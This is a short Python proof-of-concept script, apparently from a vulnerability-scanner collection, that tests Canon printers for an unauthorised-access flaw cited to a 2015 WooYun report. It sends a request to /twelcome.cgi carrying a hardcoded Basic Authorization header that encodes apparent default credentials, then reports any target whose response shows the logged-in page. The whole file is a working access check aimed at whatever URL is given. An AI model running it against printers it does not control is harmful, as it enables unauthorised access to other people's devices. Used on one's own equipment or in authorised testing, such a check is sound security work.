#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: 佳能打印机未授权漏洞
referer: http://www.wooyun.org/bugs/WooYun-2015-114364
author: Lucifer
description: 佳能打印机未授权可远程打印。
'''
import sys
import requests
import warnings
from termcolor import cprint

class printer_canon_unauth_BaseVerify:
    def __init__(self, url):
        self.url = url

    def run(self):
        headers = {
            "Authorization":"Basic MTExMTE6eC1hZG1pbg==",
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/twelcome.cgi"
        vulnurl = self.url + payload
        try:
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            if r"media/b_ok.gif" in req.text and r"_top.htm" in req.text:
                cprint("[+]存在佳能打印机未授权漏洞...(高危)\tpayload: "+vulnurl, "red")

        except:
            cprint("[-] "+__file__+"====>连接超时", "cyan")

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = printer_canon_unauth_BaseVerify(sys.argv[1])
    testVuln.run()